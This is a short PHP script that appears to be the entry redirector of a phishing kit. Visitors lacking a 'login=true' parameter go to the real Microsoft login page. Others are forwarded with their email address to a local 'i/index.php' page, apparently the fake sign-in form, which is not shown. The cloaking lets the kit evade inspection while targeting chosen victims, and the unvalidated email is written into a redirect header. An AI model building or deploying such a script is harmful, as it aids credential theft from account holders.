<?php


  $mail = $_GET["email"]; 
  
function CheckAccess()

{

  return @$_GET['login']=='true';

}

if (!CheckAccess())




{

  //show the access denied message and exit script

header('location: https://login.microsoftonline.com/');  // the banned display page

  exit;

}

//access granted, normal flow

header("location: i/index.php?email=$mail"); 


?>
